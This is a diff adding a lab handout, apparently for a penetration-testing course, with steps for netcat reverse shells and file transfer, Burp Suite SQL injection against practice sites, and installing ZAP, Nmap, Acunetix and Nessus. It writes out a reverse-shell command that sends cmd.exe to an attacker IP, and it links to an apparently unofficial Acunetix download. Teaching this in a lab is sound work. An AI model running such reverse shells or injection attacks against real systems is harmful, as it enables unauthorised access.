@@ -1,0 +1,117 @@
+Exp5-Maintaining access : Reverse shell, file transfer. Web Application Penetration Testing. 
+Automated Vulnerability scanners: Nessus, NMap, Metasploit, Acunetix.
+-------------------------------------------------------------------------------------
+
+Reverse Shell
+Netcat(Preinsatlled on Kali) or sudo apt install netcat
+
+Kali Linux Machine
+
+>>nc -lvnp 4444
+
+Windows (Target Machine)
+>>Install netcat manually from>>https://nmap.org/download.html#windows
+
+**If ncat does not work then follow the below on windows**
+
+>>Change and add the settings in windows>>Edit Environment Variable>>Environment Variable
+>>In the System variables section, scroll down and find the Path variable, then select it and click Edit.
+Click New, then add the path to the folder where ncat.exe is located (e.g., C:\Program Files\Nmap).
+
+>>cmd in windows
+>> nc <attacker-ip> 4444 -e cmd.exe
+or
+>> ncat <attacker-ip> 4444 -e cmd.exe
+
+--------------------------------------------------------------------------------------
+File Transfer (Within Kali Linux cmd)
+
+>> echo "This is a test file" > testfile.txt
+>> nc -lvnp 4444 < testfile.txt
+
+Open another terminal in kali
+>> nc <Kali ip address> 4444 > receivedfile.txt 
+
+[Optional]
+>>scp testfile.txt user@<target-ip>:/path/to/destination
+example scp testfile.txt user@192.168.52.8:/home/kali/Desktop/receivedfile.txt 
+----------------------------------------------------------------------------------------
+Burp Suite Installation Steps (Mostly Pre-Installed in Kali..if not follow the below steps)
+
+Link to Download>>https://portswigger.net/burp/communitydownload
+1.Open terminal in Downloads/or where ever the downloaded file is
+2.ls
+3.Slect the burp suite file <burpsuite_community_linux_v2024_9_4.sh>
+4.chmod +x burpsuite_community_linux_v2024_9_4.sh
+5.sudo ./burpsuite_community_linux_v2024_9_4.sh
+6.Complte the installation and run the application
+**********************************************************************************
+Method 1 (SQL Injection) (Preferable)
+>>Start a new project
+>>Proxy>>Toggle Intercept to ON>>Select Open Browser>>
+>>Choose any website
+https://juice-shop.herokuapp.com/#/
+or
+https://ginandjuice.shop/
+or 
+inet IP address of Metsplotable2 OS and access[>>http://192.168.155.94/mutillidae/index.php?page=user-info.php]>>Preferable
+>>Later off the proxy and access the vulnerable site
+>>Then enter any credentials from the login
+>>from the http history check for user login
+>>Select it>>Right click>>Send it to intruder>>Position>>edit the username or password by selecting add button on the right
+>>Select the payload .SQL>>Start Attack>>Review
+
+[How a Hacker Could Attack Web Apps with Burp Suite & SQL Injection>>NullByte]
+
+or 
+
+Method 2 (SQL Injection)
+
+Follow the below document
+
+https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/sql-injection/testing
+
+or
+
+Method 3 (Simple HTTPS Interception)
+
+https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic
+-------------------------------------------------------------------
+
+OWASP ZAP (Preinstalled on Kali..if not follow the below)
+Link>>https://www.zaproxy.org/download/
+
+1.Open terminal in Downloads/or where ever the downloaded file is>>ls
+2.chmod o+x ZAP_2_15_0_unix.sh
+3.sudo ./ZAP_2_15_0_unix.sh
+4.sudo apt install zaproxy
+*****************************************
+>>Select the application
+>>Select Automate Scan>>Enter the Target URL>>Select Attack
+------------------------------------------------------------------------------
+Nmap (Same as Exp2)
+
+>>preinstalled n kalilinux
+or
+>>sudo apt install nmap
+>>nmap <target IP address>
+----------------------------------------------------------------------------
+Acunetix
+
+https://github.com/securi3ytalent/acunetix-13-kali-linux
+https://drive.google.com/drive/folders/11dmQR4xk0cgvXcTOThK0qPCLwsIdOtIm?usp=sharing
+>>Download
+>>Move to downloads terminal
+>>Extract the files>>Left click on zip file>>extract
+>>same steps as GitHub <https://github.com/securi3ytalent/acunetix-13-kali-linux>
+------------------------------------------------------------------
+Nessus
+https://www.tenable.com/downloads/nessus?loginAttempted=true
+>>sudo apt install ./Nessus-10.8.3-debian10_amd64.deb
+>>>>Steps the download Nessus
+Check the pdf title <Nessus on KaliLinux.pdf>
+After the installation access the below link:
+https://127.0.0.1:8834/
+
+>> Create a new scan
+>>Enter Target IP Address
